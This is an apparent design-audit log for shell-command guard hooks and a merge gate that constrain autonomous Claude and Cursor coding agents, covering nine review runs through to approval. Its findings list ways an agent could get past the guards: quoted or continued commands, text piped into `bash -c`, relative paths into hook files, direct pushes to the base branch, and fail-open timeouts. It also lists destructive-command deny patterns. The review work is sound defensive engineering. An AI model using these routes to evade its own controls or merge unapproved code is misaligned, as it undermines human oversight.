  - Task 9.1 should check every Cursor file-modifying tool name, and which events fire in background agents (and that `is_background_agent` is present).
  - `doctor.ps1:49-52` has its own hook list.
  - `-Profile` shadows PowerShell's `$PROFILE`; consider `-ConfigDir`.
  - `KIT_SECRET_ALLOWLIST`: name one stripping engine and validate with it; ignore an allowlist that matches a canonical token.
  - D9 merge base: fall back to `origin/<base>`.
  - D9 verdict reader: ignore lines inside code fences.
  - Vetting: record in Risks that transitive install scripts and freshly published versions of old packages are not checked; optionally require the version itself to be at least 7 days old (author's call).
  - D12: verify leading-`*` Bash rules; optionally also deny the bypass flags through rule 8.

### 9. Task size (improvable)

- Split 5.2 into 5.2a (`active_change()`, normalisation, verdict reader) and 5.2b (table rows).
- 3.2a grows with N1 and N2: add a separate unit file for the word splitter.

### 10. Mandatory steps

Clean. Improvables:
- 12.4: the profile's merge authorisation names the throwaway base during the dry run, then is restored;
- 12.6: the expected GitHub `FAIL` during the 12.4 window;
- 12.3: the expected personal `npm install*` prompt;
- 2.3 and 10.3: how `jq` is hidden on Ubuntu (a temporary bin directory with links to the needed tools).

### 11. Traceability

Every requirement has scenarios and tasks; no hole. The scenarios N1–N4 call for go into 3.1, 3.4, 4.1 and 6.1.

(Corrections to apply: as listed in points 5–10; the main session applies them in the resolution below.)

### Resolution of run 3 (main session, 2026-10-20)

Author's answers (DIS-106 Enhanced):
- **QD** — option (b). Kit configuration is `.claude/` and `.cursor/` relative to the git working tree that contains the path, so worktrees are not blocked, plus `$CLAUDE_CONFIG_DIR`. `~/.claude` stays free. Changed: the spec requirement, D5, task 5.2a.
- **Version age** — the requested version must be at least 7 days old, on top of the package's 90 days (spec, D3, 4.1).

Findings:
- **N1 and N2** are fixed by a change of approach. Regex stripping (D6 of runs 1–3) is replaced by a shell-word parser in Node, `.claude/hooks/shell-words.mjs`. It produces simple commands with their words dequoted, plus redirections, assignments, parsed substitutions and interpreter text.
  - Rules about commands decide on those words: `rm`, push/reset/clean, installs, kit-contract writes, rule 8, merge form and selector, scratchpad.
  - Device destruction, `chmod 777`, production, `GUARD_DANGEROUS_CMD` and `gh api`/GraphQL merges keep the raw text.
  - Interpreter text (`-c` clusters, pipes into shells, `-s`, `<<<`, heredocs fed to shells, path and `env` prefixes) is matched raw.
  - A parse failure falls back to raw matching.
  - New spec scenarios:
    - "A commit message is not a command";
    - "Text piped into a shell is executed";
    - "A quoted flag is still a flag";
    - quoted write targets;
    - "An unparsable line is matched as before";
    - quoted pathspec, quoted `--admin`, quoted `gh api` path;
    - "The selector is read without its quotes";
    - a quoted scratchpad path.
  - Tasks 3.1, 3.2a (parser and its unit file), 3.2b, 3.4 and 6.1.
- **N3** fixed: the install arguments end with the simple command, so redirections are not packages. In unattended mode a chained install is denied, and rule 5's `allow` is emitted only after rules 6–8 (spec; D3; scenarios with `2>&1` and `&& git add -A`).
- **N4** fixed: `--registry`/`--userconfig` → `deny` in unattended mode (spec; D3; scenario).
- **Point 6:**
  - the rule-6 contradiction is gone with N1;
  - the D9 «Order» wording now says unattended mode;
  - the jq rule covers tool calls only, and the prompt hook keeps its behaviour (spec, D2);
  - the secret location wins over the example arm (spec scenario `secrets/x.env.example`, D8).
- **Improvables, all fixed:**
  - glob pathspecs denied in staging and reverts;
  - 9.1 checks every Cursor file-modifying tool and the background-agent events;
  - `doctor.ps1:49-52` named;
  - `-Profile` renamed to `-ConfigDir` / `--config-dir`;
  - `awk` named as the allowlist engine, with a too-wide-allowlist guard and doctor `WARN`;
  - merge-base fallback to `origin/<base>`;
  - verdict lines inside code fences ignored;
  - transitive install scripts recorded in Risks;
  - leading-`*` rules checked in 10.1, and rule 8 also denies the bypass flags;
  - 5.2 split into 5.2a and 5.2b, and the 3.2a unit file;
  - 12.3 personal prompt, 12.4 merge authorisation on the throwaway base, 12.6 expected `FAIL`;
  - how jq is hidden;
  - the "robust" wording;
  - the ticket's «Alcance» 4 and 2 wording, and the proposal's Non-goals and always-on bullet.

Next: run 4 of the auditor.

## Run 4 (2026-10-20, spec-auditor)

CHANGES REQUIRED

(Transcribed by the main session from the auditor's hand-back; the subagent's transcript file did not hold the final message.)

**Question for the author:**
- QE. A push to the base branch skips the merge gate. `git checkout final-project-CRN && git merge … && git push`, or `git push origin HEAD:final-project-CRN`, merge with none of the AC3 conditions checked. Options:
  - (a) rule 8 also denies a push to `AUTONOMOUS_MERGE_BASE` and a `git merge` while it is checked out;
  - (b) branch protection on the base, checked by the preflight.

Verification of run 3: all fixed except:
- the leading-`*` check promised in D12 was missing from task 10.1 (I-9);
- the secret-location check was missing in `protect-specs-and-tests` (I-6);
- stale "literal stripping" text in Risks and Migration (I-1);
- `shell-words.mjs` was missing from the spec's preflight bullet (I-2).

Blocking:
- **P1. Parser grammar and command-name resolution undefined.**
  - Continuation, unquoted escapes, comments, grouping and reserved words, wrappers (`sudo`, `env`, `timeout`, `xargs`, `find -exec`), basename and `.exe`, and unmodelled constructs were not specified.
  - AC1 regressions: `find . -name dist -exec rm -rf {} +`, `for … do rm -rf …; done`, `(cd x && rm -rf build)`, `sudo rm -rf x`.
  - Bypass: `git add \⏎ .claude/settings.json`.
- **P2. Parsed-only rules had no behaviour for interpreter text or a failed parse.**
  - `bash -lc "gh pr merge 61 --merge --admin"`, `sh -c 'git add -A'` and `bash -c "sed -i … .claude/hooks/lib.sh"` went undetected.
  - Installs in interpreter text were undefined.
  - An unparsable line in unattended mode was undefined.
- **P3. Relative paths ignored the command's working directory.** After `cd .claude/hooks`, `sed -i … lib.sh` escapes rule 8, and `git -C .claude add settings.json` does too. Rule 6 by basename or by path was unstated, with an AC1 regression for `echo x >> sdd-harness.env` in `.claude`.
- **P4. The merge gate failed open.** A hook timeout, a crash, or unparsable `gh` output let the merge through.
- **P5. The `gh pr merge` value flags and the selector were undefined.** `-b "…"` introduces a second positional word.

Improvable:
- the `mv` source and `ln -s` writes into kit configuration;
- a crash of the parser counts as `ok:false`;
- a `git rev-parse` per path is slow;
- `npm_config_*` assignments and `.npmrc`;
- the `eval`, `xargs` and `ssh` text;
- attached message forms;
- how Cursor combines several hooks;
- `git filter-branch` unnamed;
- relative `secrets/` paths;
- the config-dir edit case had no task;
- the 5.2b test name;
- `shell-words.mjs` in the ticket and the proposal.

### Resolution of run 4 (main session, 2026-10-20)

Author's answers:
- **QE** — branch protection **and** the hook. Recorded in DIS-106, spec ("The kit configuration…": "Bypassing the merge gate", scenario "Pushing or merging into the base directly is denied"; preflight checks the protection), D5, D13, new D20, tasks 3.4, 10.3, 10.4 and 12.1 (protection enabled with the author's confirmation).
- **Audit closure** — continue until `APPROVED`.

Findings:
- **P1 fixed.** The spec and D6 define:
  - lexing (continuation, unquoted escapes, comments);
  - grouping and reserved words;
  - command-name resolution through the listed wrappers, by basename without `.exe`;
  - `find -exec`;
  - unmodelled constructs → unparsable.

  New scenarios "Wrapped, grouped and looped commands are found" and "A continued line is one command". 3.2a lists the unit cases.
- **P2 fixed.**
  - `bash`/`sh`/`zsh` text is parsed recursively (`inInterp`), so rule 8, merge detection and installs apply to it.
  - Other interpreters are matched raw, including a raw merge pattern in unattended mode.
  - Merges inside interpreters are denied.
  - Installs found only in interpreter text or on an unparsable line are denied.
  - An unparsable line is denied in unattended mode, while the switch-off fallback is unchanged.
  - Scenarios added.
- **P3 fixed.**
  - Paths are resolved with the command's `cwd`, a preceding `cd` and `git -C` (spec, D5, D6, D7).
  - Rule 6 matches the basename `sdd-harness.env`.
  - Scenarios "A relative write is resolved against the working directory" and the `cwd`/`git -C` cases of "Editing kit configuration is denied".
- **P4 fixed.**
  - `timeout 15`;
  - unparsable output → `deny`;
  - a fail-closed `EXIT` trap in unattended mode;
  - the spec states it;
  - the 6.1 shim cases sleep 20 s and print non-JSON, plus an unnamed crash test.
- **P5 fixed:** the value-flag list, at most one positional word, the scenarios "Two positional words are denied" and `-b "--admin text"`.
- **I-1, I-2, I-6, I-9 fixed.**
- **Improvables fixed:**
  - the `mv` source and `ln`;
  - a parser crash or timeout → `ok:false`;
  - the rev-parse shortcut and cache;
  - `npm_config_*` → deny, and `.npmrc` in Risks;
  - the `eval`/`xargs`/`ssh` text;
  - attached message forms and `gh -b`/`-F`/`-t`;
  - 9.1 checks how Cursor combines hooks;
  - `git filter-branch` named;
  - relative `secrets/` arms;
  - the config-dir case in 5.1;
  - the 5.2b test named;
  - `shell-words.mjs` in the ticket and the proposal.

Correction made by the main session: D6 had said `--force-with-lease` is denied "as today". The current rule (`--force([^-]|$)`) does not deny it, and D6 now says it stays allowed.

Next: run 5 of the auditor.

## Run 5 (2026-10-20, spec-auditor)

CHANGES REQUIRED

(Transcribed by the main session from the auditor's hand-back.)

Questions:
- **QF** — classic branch protection does not bind administrators unless `enforce_admins` is on. The agent uses the owner's credentials.
- **QG** — under Q3 the autonomous propose cannot fix its own artifacts before the first audit.

Verification of run 4: P4, P5, I-1, I-2, I-6 and I-9 fixed. QE, P1, P2 and P3 partly fixed (see below). All improvables fixed. The `--force-with-lease` correction is right.

Blocking:
- **B1.** Denying every `npx` in unattended mode blocks `npx vitest run`, the project's test command (`CMD_TEST`, `project-context.md`).
- **B2.** D6 applied the raw merge pattern to the whole line. That contradicts "Mentioning the command in text is not a merge", and would deny every `gh pr create --body "…merge…"`.
- **B3.** For a pipe into a shell, D6 parsed the previous commands (`echo`), so `echo "rm -rf packages" | bash` was no longer denied (an AC1 regression), and `echo "git add -A" | sh` escaped rule 8.
- **B4.** Without `enforce_admins` the protection does not stop the owner's token, and the D13 check passed on that setup.
- **B5.** `~` and `$VAR` path words were undefined (`"$CLAUDE_PROJECT_DIR/.claude/hooks/lib.sh"`, the `~/.claude-…` profile).
- **B6.** Rule 1 by name lost today's deny of `git rm -r`, `docker rm -f` and `npm rm -g` (an AC1 regression).

Improvable:
- I1: comments run to the end of the line;
- I2: `\x` is literal;
- I3: general redirections and fd duplications;
- I4: manager and verb pairs;
- I6: git global options;
- I7: `pushd`/`popd`;
- I8: push forms `+refspec`, no refspec, `--all`, `--mirror`;
- I9: plan availability, and 12.6 expectations;
- I10: the gate checks `.protected`;
- I11: fail-closed traps in the other guards;
- I12: Risks — script files, other writers, `xargs` pipe;
- I14: no worktree isolation;
- strict false and named contexts;
- 3.2a split;
- 3.1 counts;
- vitest timeouts;
- jq hiding on Windows;
- the switch-off mode for the commit-message scenario.

### Resolution of run 5 (main session, 2026-10-20)

Author's answers:
- **QF** — yes, `enforce_admins`. D20 has the payload (`enforce_admins: true`, `strict: false`, contexts `scope`, `quality`, `verify`, `mutation` and `secrets` — `frontend.yml` excluded because its path filter would leave PRs pending — and no approving review). The preflight checks `enforce_admins` (spec, D13). The repository is public (`gh repo view`), so protection is available. Recorded in DIS-106.
- **QG** — artifacts are free while the change has no spec-audit report; once one exists, only `APPROVED` allows rewrites (spec, D9, scenario "Artifacts are free before the first audit"). Recorded in DIS-106.

Findings:
- **B1 fixed:** `npx`/`npm exec` of a local binary get no decision; `-p`, `@version` or a missing binary → deny; `dlx`/`bunx` denied (spec, D3; scenario "A locally installed binary runs").
- **B2 fixed:** the raw merge pattern applies to `rawInterpreterText` only (D6; `gh pr create --body` case in 6.1).
- **B3 fixed:** a pipe into a shell is matched raw on the whole line, as today, and denied in unattended mode (spec; D6 `pipeIntoShell`; scenario "A pipe into a shell is denied in unattended mode"; the `echo "git add -A" | sh` case).
- **B4 fixed:** QF.
- **B5 fixed:** `~` expands; `$`/backtick words and an unknown `cwd` count as kit configuration in an autonomous run (spec "Paths", D6; the `$CLAUDE_PROJECT_DIR` case).
- **B6 fixed:** rule 1 keeps the `rm` subcommand of another tool with an `r`/`f` flag (spec, D6; added to the switch-off scenario and the 0.4 baseline).
- **I1–I4, I6–I12 and I14 fixed** as listed, including the gate's `.protected` check (D4; spec merge conditions) and the D21 traps and contract.
- **Task improvables fixed:** 3.2a split into 3.2a-i and 3.2a-ii; counts; vitest timeouts; jq on Windows; the commit-message scenario names the switch; 12.4/12.6 handle the throwaway base's protection.

Next: run 6 of the auditor.

## Run 6 (2026-10-20, spec-auditor)

CHANGES REQUIRED

(Transcribed by the main session from the auditor's hand-back.)

Question:
- **QH (not blocking).** D8 denied edits of any file under `secrets/` in both modes, a switch-off change. The default fix narrows it back.

Verification of run 5: QF, QG, B1–B4, B6, I1–I4, I6–I12 and I14 fixed. B5 partly fixed (dynamic `cd` directory). The 12.4/12.6 ordering is broken.

Blocking:
- **B1.** The gate's time budget (parser 5 s plus two sequential 15 s queries) exceeded its 30 s hook timeout. A hook timeout fails open.
- **B2.** `cd "$VAR"`, `git -C "$DIR"`: a dynamic directory word was undefined, so `cd "$CLAUDE_PROJECT_DIR" && git add .claude/settings.json` could escape rule 8.
- **B3.** D8's secret-location arm in `protect-specs-and-tests.sh` changed switch-off decisions (an AC1 violation).
- **B4.** Task 12.4's order could not reach "the gate allows":
  - rule 8 denies pushing the throwaway base once it is set as the base;
  - its protection was written in 12.6, after 12.4;
  - the branch could not be deleted while protected and the switch was on.

Improvable:
- I1: rule 1 needs an `r`/`f` flag, and the `rm` word may come later (`docker compose rm -f`);
- I2: `gh api` has no `-R`, so use `GH_REPO`;
- I3: CI's `runtime` filter lacks `.claude/hooks/**` and `.cursor/hooks.json`, and there is no "test" job;
- I4: D20's `frontend.yml` reason was wrong — it has no trigger path filter;
- I5: deleting the report reopens the QG window;
- I6: the shim must answer `gh api`;
- I7: the crash test trigger;
- I8: the hooks are live in the implementing session;
- I9: helpers order (3.4 before 5.2a);
- I10: 12.3 chained `cd`;
- the protected bullet in the full-conditions scenario;
- the short-cluster `a` in the commit bullet;
- version age in the proposal;
- Impact files.

### Resolution of run 6 (main session, 2026-10-20)

- **QH:** default applied. There is no secret-location deny arm. The example arm skips paths with a `secrets`/`.secrets` component, which fall through to `*.env.*` as today (D8). The 5.3 switch-off test covers `secrets/api.key`. AC1 is unchanged.
- **B1 fixed:** the gate's hook timeout is 60 s in both clients, and the parser and the two GitHub queries run in parallel under one `timeout 15` (D4; spec wording "the GitHub queries do not finish within 15 seconds"; 6.1 case sleeping only on `gh api`; 6.2, 9.4).
- **B2 fixed:** a dynamic `cd`/`pushd`/`git -C`/`--work-tree` directory makes `cwd` unknown (spec "Paths", D6; scenario case and 3.2a-ii, 3.4).
- **B3 fixed:** QH.
- **B4 fixed:** 12.4 rewritten in the auditor's order (base created and protected with the switch off, set the switch, deny/allow, restore, unprotect, delete); 12.6 keeps only the doctor run; 12.7 lists the protection removal.
- **I1–I10 and the minor items fixed** as listed:
  - `GH_REPO` for `-R`;
  - the `runtime` filter in 1.1 and D15;
  - the D20 `frontend` sentence corrected (the main session's earlier claim of a path filter was wrong);
  - Risks I5 and I8;
  - the `jq`-shim crash trigger;
  - helpers created in 3.4 and reused in 5.2a;
  - `--prefix` in 12.3;
  - the scenario and bullet texts;
  - the proposal.

Next: run 7 of the auditor.

## Run 7 (2026-10-20, spec-auditor)

CHANGES REQUIRED

(Transcribed by the main session from the auditor's hand-back.) No questions for the author.

Verification of run 6: every fix present.
- The D4 time-budget wording is unclear (I1).
- The 6.2 crash trigger does not crash (I2).

Blocking:
- **B1.** Q3 was enforced only for artifact rewrites. `spec-audit-gate.sh:50` lets code and tests through with any report, `CHANGES REQUIRED` included, so rule 2's replacement and §7.1 step 4 were not upheld on the apply.
- **B2.** The "test the branch created" merge base used the local base first. In an autonomous run the local base never moves forward (merges happen on GitHub), so earlier tickets' tests would look branch-created.
- **B3.** 12.4 did not say where the throwaway head gets its commits. A checkout in the main working tree would drop the gate (an older `.claude/`) or fail on the local switch file.

Improvable:
- I1: the D4 wording on the parser and the parallel queries;
- I2: the crash trigger and `deny()` failing open when jq fails;
- I3: the D8 deny list "becomes" read as dropping other entries;
- I4: an `a` in the cluster vs `-m"add x"`;
- I5: "flag word containing r/f" matches `--verbose`;
- I6: 12.2 `reset --hard` answer;
- I7: the profile's own memory files are kit configuration;
- I8: `gh api` can delete the protection;
- D11 timeouts (60 s for the gate, `docs-gate`);
- the 12.1 duplicate sentence.

### Resolution of run 7 (main session, 2026-10-20)

- **B1 fixed.** In unattended mode the spec-audit gate requires the latest verdict `APPROVED`: no report → deny as today, `CHANGES REQUIRED` → deny. The main session chose unattended mode (not only autonomous runs), because a background agent must not code on an unapproved change either. Outside unattended mode the rule is unchanged. Covered by a requirement clause, the scenario "No code is written after a CHANGES REQUIRED audit", D9, D16 rule 2, tasks 5.1 and 5.2a, and the proposal.
- **B2 fixed:** `origin/<base>` first and the local base as fallback (spec, D9, the scenario "A test added to the base by an earlier ticket is not the branch's own", 5.1, 5.2a).
- **B3 fixed:** 12.4 builds the head in a scratchpad worktree, commits with `git -C <wt> add <path>`, keeps the main tree on the feature branch, checks the current branch before each merge, and removes the worktree at the end (12.7).
- **I1–I8 and the minor items fixed:**
  - D4 wording, with the protection query on `AUTONOMOUS_MERGE_BASE`;
  - the EXIT trap writes to stderr and exits 2 without jq, and `deny()` exits 2 when jq fails;
  - the 6.2 shim fails only on `statusCheckRollup`;
  - D8 "every other entry stays";
  - the commit-cluster rule;
  - the `rm` short-option regex as today;
  - 12.2 answer No;
  - D5 profile memory note;
  - rule 8 denies non-GET `gh api` on `…/branches/*/protection`, plus a Risks entry;
  - D11 timeouts;
  - the 12.1 duplicate removed.

Next: run 8 of the auditor.

## Run 8 (2026-10-20, spec-auditor)

CHANGES REQUIRED

(Transcribed by the main session from the auditor's hand-back.) No questions for the author.

Verification of run 7:
- B2, B3, I1–I7, the D11 timeouts and the 12.1 duplicate are fixed.
- B1 is partly fixed: two early exits of `spec-audit-gate.sh` remain.
- I8 was fixed in the design only.

Blocking:
- **B1.** In unattended mode the spec-audit gate still passed when no active change could be determined (exits at lines 23, 32 and 48; D9 kept the pass-through). That contradicts the spec, and code can be written before the propose of the next ticket.
- **B2.** `KIT_SPEC_AUDIT_GATE="0"` (exit at line 13) was unaddressed in unattended mode.

Improvable:
- I1: the `gh api` protection rule — not in the spec, `[^/]+` misses slashes, fields imply POST;
- I2: the proposal and D16 conflated the autonomous-only relaxation with the unattended enforcement;
- I3: the 12.4 worktree upstream and push;
- I4: the D4 "one query" leftover;
- I5: the `rm` flag position is stricter than today;
- the ticket lines.

### Resolution of run 8 (main session, 2026-10-20)

- **B1 fixed:** in unattended mode the gate denies when no active change can be determined, naming the branch (spec clause, scenario "No code is written without an active change in unattended mode", D9, 5.1, 5.2a). Outside unattended mode the pass-through stays.
- **B2 fixed:** the unattended rule applies regardless of `KIT_SPEC_AUDIT_GATE`. The switch's exit moves after the unattended check (D9). The 5.1 case runs with the switch at `"1"` and `"0"`. The preflight reports `KIT_SPEC_AUDIT_GATE`/`KIT_PROTECT_SPECS` at `"0"` as `WARN` (spec, D13, 10.3).
- **I1 fixed:** a spec bullet and scenario case; D5 regex `/branches/.+/protection(/|$)`, with fields treated as non-GET; a 3.4 case.
- **I2 fixed:** the proposal and D16 separate the relaxation (autonomous run) from the enforcement (unattended mode).
- **I3 fixed:** the throwaway names are now slash-free (`tmp-autonomous-dry-run`, `tmp-autonomous-dry-head`); `--no-track`, plus `push -u origin tmp-autonomous-dry-head`.
- **I4 fixed:** "Then it runs two queries in parallel".
- **I5 fixed:** rule 1 looks at the leading option words only, as today (spec, D6).
- **Ticket:** updated in Linear.

Next: run 9 of the auditor.

## Run 9 (2026-10-20, spec-auditor)

(Transcribed by the main session from the auditor's hand-back.)

Verdict of run 9:

APPROVED

No questions for the author.

Run 8's fixes are verified: B1, B2, I1, I2, I3 and I5 fully; I4 partly, since the D4 heading was stale. The ticket lines are verified too. Nothing is blocking.

Improvables listed:
- the D4 heading;
- the attached `-X`/`--method` forms;
- the `rm` option position, where "leading option words" was stricter than today;
- the `spec-audit-gate.sh` fail-closed trap;
- `deny()` exits 2 on a jq failure in both modes, which is a switch-off change;
- a Risks entry: shell writes bypass the Edit/Write spec-audit gate;
- a preflight `WARN` scenario;
- the no-change case run with `KIT_SPEC_AUDIT_GATE` `"0"`;
- `active_change()` with no `openspec/changes/`;
- a code fix after the archive is a clean stop.

### Resolution of run 9 (main session, 2026-10-20)

All improvables were applied before the apply:
- D4 heading renamed;
- `-X<m>`/`--method=<m>` named in D5 and the spec, with a `--method=DELETE` case in 3.4;
- rule 1 uses "the option words immediately after `rm`, up to the first word that does not match", today's position, in D6 and the spec;
- D21 adds the trap to `spec-audit-gate.sh` and limits the `deny()` jq change to unattended mode;
- a Risks entry for shell writes of code, and the contract forbids them (9.5, 13.2);
- the scenario "A disabled spec protection gives a warning", with its 10.3 test;
- 5.1 runs the no-change case with both switch values;
- 5.2a states the missing-directory case and adds the trap;
- 9.5 and 13.2 list the post-archive code fix as a clean stop.

These are wording, test-coverage and Risks additions within the approved design. No requirement changes direction, so the run-9 verdict stands, and the change is ready for `/opsx:apply`.

Final verdict:

APPROVED
